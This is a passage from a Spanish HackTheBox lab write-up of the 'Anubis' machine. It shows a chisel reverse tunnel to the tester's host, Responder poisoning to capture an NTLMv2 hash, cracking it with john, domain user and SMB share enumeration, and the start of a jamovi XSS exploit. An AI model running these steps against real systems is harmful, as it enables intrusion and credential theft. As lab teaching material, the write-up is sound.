</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\c</span>hisel.exe client 10.10.14.74:7777 R:socks
</code></pre></div></div>

<ul>
  <li>Ahora definimos el proxy para poder ver el contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/8.png" />
</p>

<ul>
  <li>Esta es la web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/9.png" />
</p>

<ul>
  <li>Vemos que hay un apartado donde la empresa ofrece software si ponemos el cursos en alguna de ellos vemos que en la URL pone una IP y el recurso.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/10.png" />
</p>

<ul>
  <li>
    <p>Lo que podemos hacer es manipular esa petición que se hace para ver a donde viaja.</p>
  </li>
  <li>
    <p>Vamos a ponernos a capturar el trafico para verlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 <span class="nt">-w</span> Captura.cap <span class="nt">-v</span>
</code></pre></div></div>

<ul>
  <li>Y ahora cambiamos la IP a la nuestra y enviamos la petición pasando por el tunel.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s1">'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.74&amp;software=7z1900-x64.exe'</span>
</code></pre></div></div>

<ul>
  <li>Ahora analizamos la captura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura.cap 2&gt;/dev/null
</code></pre></div></div>

<ul>
  <li>Vemos que hay varias conexiones al puerto <code class="language-plaintext highlighter-rouge">5985</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   70   9.313637  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50335 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   71   9.923557 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50335 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   72   9.923609  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50335 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   73  10.032167 10.10.11.102 → 10.10.14.74  TCP 52 50336 → 5985 <span class="o">[</span>SYN, ECE, CWR] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   74  10.032215  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   75  10.641543 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50336 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   76  10.641575  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   77  11.251435 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50336 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   78  11.251515  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
</code></pre></div></div>

<ul>
  <li>Ese puerto corresponde al servicio <code class="language-plaintext highlighter-rouge">winrm</code> si se esta comunicando a ese puerto esta viajando alguna autenticación podemos usar responder para al momento de enviar otra petición capturar algún hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> del usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>OFF]
    Force ESS downgrade        <span class="o">[</span>OFF]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.74]
    Responder IPv6             <span class="o">[</span>dead:beef:2::1048]
    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-P9UIMI6NYMM]
    Responder Domain Name      [DB1Q.LOCAL]
    Responder DCE-RPC Port     [45735]

[+] Listening for events...
</span></code></pre></div></div>

<ul>
  <li>Ahora que desplegamos el envenenador vamos a enviar la petición.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s1">'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.74&amp;software=7z1900-x64.exe'</span>
</code></pre></div></div>

<ul>
  <li>Obtenemos un hash.</li>
</ul>

<blockquote>
  <p>En tu caso si es la primera vez que haces la máquina el hash te debe de llegar al responder pero como yo ya lo había capturado antes responder lo ignora entonces puedo volver a verlo por que guarda los hashes en una ruta.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>WinRM-NTLMv2-10.10.11.102.txt
localadmin::windcorp:ec8df8b609e70f41:208735772A1677823E7F75FA31D0C715:0101000000000000646B94F8C5D4DA01E2910B524E97D48700000000020008005700460056005A0001001E00570049004E002D0052005600450036005800380034004D00300045004C00040014005700460056005A002E004C004F00430041004C0003003400570049004E002D0052005600450036005800380034004D00300045004C002E005700460056005A002E004C004F00430041004C00050014005700460056005A002E004C004F00430041004C0008003000300000000000000000000000002100003BED58472DA82F8CAD355A301647ABF7E78023B354D051483303EF7C0F5FC5340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370034000000000000000000
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
❯ john <span class="nt">--show</span> hash.txt
localadmin:Secret123:windcorp:ec8df8b609e70f41:208735772A1677823E7F75FA31D0C715:0101000000000000646B94F8C5D4DA01E2910B524E97D48700000000020008005700460056005A0001001E00570049004E002D0052005600450036005800380034004D00300045004C00040014005700460056005A002E004C004F00430041004C0003003400570049004E002D0052005600450036005800380034004D00300045004C002E005700460056005A002E004C004F00430041004C00050014005700460056005A002E004C004F00430041004C0008003000300000000000000000000000002100003BED58472DA82F8CAD355A301647ABF7E78023B354D051483303EF7C0F5FC5340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370034000000000000000000

1 password <span class="nb">hash </span>cracked, 0 left
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora tenemos credenciales <code class="language-plaintext highlighter-rouge">localadmin:Secret123</code> .</p>
  </li>
  <li>
    <p>Son correctas en la máquina real.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> localadmin <span class="nt">-p</span> Secret123
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\l</span>ocaladmin:Secret123
</code></pre></div></div>

<h2 id="shell-as-diegocruz-and-user-flag">Shell as diegocruz and user flag</h2>

<ul>
  <li>Como tenemos credenciales validas podemos enumerar por RPC y podemos ver los nombres de los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.102 <span class="nt">-U</span> <span class="s1">'localadmin%Secret123'</span> <span class="nt">-c</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[FalkUela] rid:[0xc26]
user:[CurtisChav] rid:[0xc27]
user:[RyderRoss] rid:[0xc28]
user:[TammyLawr] rid:[0xc29]
user:[ZoePerk] rid:[0xc2a]
user:[AgnieszkaFour] rid:[0xc2b]
user:[IgorCarv] rid:[0xc2c]
user:[Denada R] rid:[0xc2d]
user:[AmyBouc] rid:[0xc2e]
user:[BaptisteCaro] rid:[0xc2f]
user:[JonathanPayn] rid:[0xc30]
user:[محمدمهدیحیدر] rid:[0xc31]
user:[AlyssiaDavi] rid:[0xc32]
user:[SusanaSoto] rid:[0xc33]
user:[IslaLatt] rid:[0xc34]
user:[KellyGran] rid:[0xc35]
user:[SkyVan <span class="o">]</span> rid:[0xc36]
user:[AnitaStro] rid:[0xc37]
user:[YasminSchm] rid:[0xc38]
user:[EvaMath] rid:[0xc39]
user:[MelodieNova] rid:[0xc3a]
user:[MareikeZiel] rid:[0xc3b]
user:[NihalKunt] rid:[0xc3c]
user:[SohamCoop] rid:[0xc3d]
user:[DarrenLong] rid:[0xc3e]
user:[ÜlküTunç] rid:[0xc3f]
user:[FelixWill] rid:[0xc40]
user:[ElizabethMarg] rid:[0xc41]
user:[AriannaGray] rid:[0xc42]
user:[تیناعلیز] rid:[0xc43]
user:[CoryMurr] rid:[0xc44]
user:[AnatoleMich] rid:[0xc45]
user:[آویننجات] rid:[0xc46]
user:[NevilleVan <span class="o">]</span> rid:[0xc47]
user:[LeanaOliv] rid:[0xc48]
user:[PhilipJørg] rid:[0xc49]
user:[FernandoMcco] rid:[0xc4a]
user:[IsabellaAnde] rid:[0xc4b]
user:[IndiraCarv] rid:[0xc4c]
user:[MartinIgle] rid:[0xc4d]
user:[SammyCald] rid:[0xc4e]
user:[PatriciaRoge] rid:[0xc4f]
user:[SamuHeik] rid:[0xc50]
user:[BrielleGinn] rid:[0xc51]
user:[HollyWatt] rid:[0xc52]
user:[GuillermoFuen] rid:[0xc53]
user:[MaltheKris] rid:[0xc54]
user:[AstridThom] rid:[0xc55]
user:[SohailaWitv] rid:[0xc56]
user:[MerithLand] rid:[0xc57]
user:[HaileyWill] rid:[0xc58]
user:[MelvinFour] rid:[0xc59]
user:[NurdanGönü] rid:[0xc5a]
user:[ElsaRaut] rid:[0xc5b]
user:[NicolaiNeub] rid:[0xc5c]
user:[GeorgeMore] rid:[0xc5d]
user:[BarthelomeusTukk] rid:[0xc5e]
user:[JustinaGöpf] rid:[0xc5f]
user:[YaseminKumc] rid:[0xc60]
user:[VanessaMart] rid:[0xc61]
user:[GabriëllaVisk] rid:[0xc62]
user:[AfetErbu] rid:[0xc63]
user:[MontserratHida] rid:[0xc64]
user:[CourtneyRose] rid:[0xc65]
user:[AbigailKell] rid:[0xc66]
user:[TomGrah] rid:[0xc67]
user:[LouisonThom] rid:[0xc68]
user:[RogerSanc] rid:[0xc69]
user:[مهدیسکریم] rid:[0xc6a]
user:[ValentinGome] rid:[0xc6b]
user:[OliviaSalm] rid:[0xc6c]
user:[DennisWade] rid:[0xc6d]
user:[DenyVan <span class="o">]</span> rid:[0xc6e]
user:[CecilieMads] rid:[0xc6f]
user:[CecilieChri] rid:[0xc70]
user:[AugusteGira] rid:[0xc71]
user:[LærkeOlse] rid:[0xc72]
user:[AiméeRodr] rid:[0xc73]
user:[VernonGuti] rid:[0xc74]
user:[AliGerl] rid:[0xc75]
user:[BuseNuma] rid:[0xc76]
user:[ClaraMoli] rid:[0xc77]
user:[AdemPekt] rid:[0xc78]
user:[JacobTurn] rid:[0xc79]
user:[InmaculadaGuer] rid:[0xc7a]
user:[VickieGuti] rid:[0xc7b]
user:[ShellyGran] rid:[0xc7c]
user:[EmmaPoul] rid:[0xc7d]
user:[HeatherHarr] rid:[0xc7e]
user:[VilmaKjel] rid:[0xc7f]
user:[LeanaEnge] rid:[0xc80]
user:[UmutAkgü] rid:[0xc81]
user:[JorianAppe] rid:[0xc82]
user:[DavePerk] rid:[0xc83]
user:[IsabelleWang] rid:[0xc84]
user:[KathleenMyer] rid:[0xc85]
user:[NotburgaKäfe] rid:[0xc86]
user:[RasmusRant] rid:[0xc87]
user:[MohamedAria] rid:[0xc88]
user:[AbigailGray] rid:[0xc89]
user:[JuliaPell] rid:[0xc8a]
user:[ReginaldoJesu] rid:[0xc8b]
user:[HaileyFren] rid:[0xc8c]
user:[EzraBrow] rid:[0xc8d]
user:[EvelynNesh] rid:[0xc8e]
user:[SarahScot] rid:[0xc8f]
user:[ViljamiLatv] rid:[0xc90]
user:[LoganDixo] rid:[0xc91]
user:[کیاناقاسم] rid:[0xc92]
user:[MillePede] rid:[0xc93]
user:[طاهازارع] rid:[0xc94]
user:[LenniMart] rid:[0xc95]
user:[CesarLoza] rid:[0xc96]
user:[SebastianJoha] rid:[0xc97]
user:[GundelDree] rid:[0xc98]
user:[Hans-WolfgangTill] rid:[0xc99]
user:[EdwardGilb] rid:[0xc9a]
user:[LoganWalk] rid:[0xc9b]
user:[TakeEdel] rid:[0xc9c]
user:[ZehraWeis] rid:[0xc9d]
user:[LolaDani] rid:[0xc9e]
user:[OliverTikk] rid:[0xc9f]
user:[SeanCarr] rid:[0xca0]
user:[JoseSmyt] rid:[0xca1]
user:[AntonKaup] rid:[0xca2]
user:[FlorenceRamo] rid:[0xca3]
user:[DavidLecl] rid:[0xca4]
user:[ZakariaeVan <span class="o">]</span> rid:[0xca5]
user:[FranciscoMeun] rid:[0xca6]
user:[MeganScot] rid:[0xca7]
user:[LyamMass] rid:[0xca8]
user:[OlveSund] rid:[0xca9]
user:[AndreaLefe] rid:[0xcaa]
user:[JuddSimm] rid:[0xcab]
user:[KübraKoço] rid:[0xcac]
user:[DiegoCruz] rid:[0xcad]
user:[MaryMaso] rid:[0xcae]
user:[EmmettØstm] rid:[0xcaf]
user:[LyamRodr] rid:[0xcb0]
user:[UliBeut] rid:[0xcb1]
user:[RileyMill] rid:[0xcb2]
user:[یلداكامي] rid:[0xcb3]
user:[AlexisRoll] rid:[0xcb4]
user:[LinneaLait] rid:[0xcb5]
user:[LenniHarj] rid:[0xcb6]
user:[TimWelc] rid:[0xcb7]
user:[JoaquinLoza] rid:[0xcb8]
user:[ThomasPerr] rid:[0xcb9]
user:[VilhoRaja] rid:[0xcba]
user:[KittySton] rid:[0xcbb]
user:[MucahitVan <span class="o">]</span> rid:[0xcbc]
user:[RicardoHunt] rid:[0xcbd]
user:[ElsaDuma] rid:[0xcbe]
user:[RalphMaiw] rid:[0xcbf]
user:[JordiGuer] rid:[0xcc0]
user:[LutzHell] rid:[0xcc1]
user:[LucyFont] rid:[0xcc2]
user:[Afonso HenriquesMend] rid:[0xcc3]
user:[Karl-HermannSchl] rid:[0xcc4]
user:[TorstenBätz] rid:[0xcc5]
user:[DewyLier] rid:[0xcc6]
user:[کیاناپارس] rid:[0xcc7]
user:[JonathanBeni] rid:[0xcc8]
user:[MitchellHill] rid:[0xcc9]
user:[GaëtanAube] rid:[0xcca]
user:[حامدرضای] rid:[0xccb]
user:[ZéliaTeix] rid:[0xccc]
user:[LícioMora] rid:[0xccd]
user:[DannyWeis] rid:[0xcce]
user:[SofieKind] rid:[0xccf]
user:[MarieJoha] rid:[0xcd0]
user:[LeanneYoun] rid:[0xcd1]
user:[EemilLepp] rid:[0xcd2]
user:[LiamMore] rid:[0xcd3]
user:[BarbaraWebb] rid:[0xcd4]
user:[localadmin] rid:[0xcd9]
</code></pre></div></div>

<ul>
  <li>Podríamos probar un ASREPRoast Attack <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a> pero al parecer hay un problema con el puerto 88 y no se ejecuta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers windcorp.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt <span class="nt">-debug</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
<span class="o">[</span>+] Trying to connect to KDC at WINDCORP.HTB:88
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.102 <span class="nt">-U</span> <span class="s1">'localadmin%Secret123'</span> <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
❯ <span class="nb">wc</span> <span class="nt">-l</span> users.txt
179 users.txt
</code></pre></div></div>

<ul>
  <li>Así que vamos a listar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> localadmin <span class="nt">-p</span> Secret123  <span class="nt">--shares</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\l</span>ocaladmin:Secret123
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.102    445    EARTH            Share           Permissions     Remark
SMB         10.10.11.102    445    EARTH            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.102    445    EARTH            ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.102    445    EARTH            C<span class="nv">$ </span>                             Default share
SMB         10.10.11.102    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.102    445    EARTH            IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.102    445    EARTH            NETLOGON        READ            Logon server share
SMB         10.10.11.102    445    EARTH            Shared          READ
SMB         10.10.11.102    445    EARTH            SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos privilegios de lectura en <code class="language-plaintext highlighter-rouge">Shared</code> vamos a ver que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.102/Shared <span class="nt">-U</span> windcorp.htb/localadmin Secret123
Password <span class="k">for</span> <span class="o">[</span>WINDCORP.HTB<span class="se">\l</span>ocaladmin]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Apr 28 10:06:06 2021
  ..                                  D        0  Wed Apr 28 10:06:06 2021
  Documents                           D        0  Mon Apr 26 23:09:25 2021
  Software                            D        0  Thu Jul 22 13:14:16 2021

		9034239 blocks of size 4096. 3227232 blocks available
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">.omv</code> <a href="https://docs.jamovi.org/_pages/info_file-format.html">https://docs.jamovi.org/_pages/info_file-format.html</a>.</p>
  </li>
  <li>
    <p>En la web de jamovi nos dicen que hay archivos en un zip.</p>
  </li>
  <li>
    <p>Vamos a descargarnos los archivos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\&gt;</span> mget <span class="k">*</span>.omv
Get file Big 5.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\B</span>ig 5.omv of size 6455 as Big 5.omv <span class="o">(</span>14.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 14.1 KiloBytes/sec<span class="o">)</span>
Get file Bugs.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\B</span>ugs.omv of size 2897 as Bugs.omv <span class="o">(</span>6.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 10.4 KiloBytes/sec<span class="o">)</span>
Get file Tooth Growth.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\T</span>ooth Growth.omv of size 2142 as Tooth Growth.omv <span class="o">(</span>4.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.6 KiloBytes/sec<span class="o">)</span>
Get file Whatif.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\W</span>hatif.omv of size 2841 as Whatif.omv <span class="o">(</span>6.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.1 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vemos que en este archivo es donde se encuentran los archivos que nos decían en la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l Whatif.omv

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 2841 bytes <span class="o">(</span>3 KiB<span class="o">)</span>

Listing archive: Whatif.omv

<span class="nt">--</span>
Path <span class="o">=</span> Whatif.omv
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 2841

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2021-04-27 11:38:38 .....          106           74  META-INF/MANIFEST.MF
2021-04-27 11:38:38 .....         2505          823  index.html
2021-04-27 11:38:40 .....         1575          317  metadata.json
2021-04-27 11:38:40 .....          114           76  xdata.json
2021-04-27 11:38:40 .....         5400          871  data.bin
2021-04-27 11:38:40 .....           50           46  01 empty/analysis
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2021-04-27 11:38:40               9750         2207  6 files
</code></pre></div></div>

<ul>
  <li>Si vemos con la herramienta <code class="language-plaintext highlighter-rouge">smbcacls</code> los privilegios vemos que los usuarios tienen privilegio FULL en el directorio donde nos descargamos todo eso significa que podemos escribir dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbcacls <span class="nt">-U</span> localadmin%Secret123 <span class="s2">"//windcorp.htb/Shared"</span> <span class="s2">"Documents/Analytics"</span>
REVISION:1
CONTROL:SR|DI|DP
OWNER:WINDCORP<span class="se">\D</span>iegoCruz
GROUP:WINDCORP<span class="se">\D</span>omain Users
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/OI|CI/FULL
ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/OI|CI|I/READ
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/CI|I/0x00000004
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/CI|I/0x00000002
ACL:WINDCORP<span class="se">\D</span>iegoCruz:ALLOWED/I/FULL
ACL:CREATOR OWNER:ALLOWED/OI|CI|IO|I/0x10000000
</code></pre></div></div>

<ul>
  <li>Vamos a descomprimir para examinar los archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip Whatif.omv
Archive:  Whatif.omv
  inflating: META-INF/MANIFEST.MF
  inflating: index.html
  inflating: metadata.json
  inflating: xdata.json
  inflating: data.bin
  inflating: 01 empty/analysis
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos vulnerabilidades sobre esto encontramos un CVE sobre un XSS <a href="https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md">https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md</a>.</p>
  </li>
  <li>
    <p>Aquí nos dicen como explotarlo <a href="https://github.com/g33xter/CVE-2021-28079">https://github.com/g33xter/CVE-2021-28079</a>.</p>
  </li>
  <li>
    <p>La vulnerabilidad ocurre en el campo “name”.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>metadata.json | jq | <span class="nb">head</span>
<span class="o">{</span>
  <span class="s2">"dataSet"</span>: <span class="o">{</span>
    <span class="s2">"rowCount"</span>: 150,
    <span class="s2">"columnCount"</span>: 5,
    <span class="s2">"removedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"addedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"fields"</span>: <span class="o">[</span>
      <span class="o">{</span>
        <span class="s2">"name"</span>: <span class="s2">"Sepal.Length"</span>,
        <span class="s2">"id"</span>: 1,
</code></pre></div></div>

<ul>
  <li>
    <p>En el POC nos dicen que podemos cargar un archivo <code class="language-plaintext highlighter-rouge">.js</code> en ese campo.</p>
  </li>
  <li>
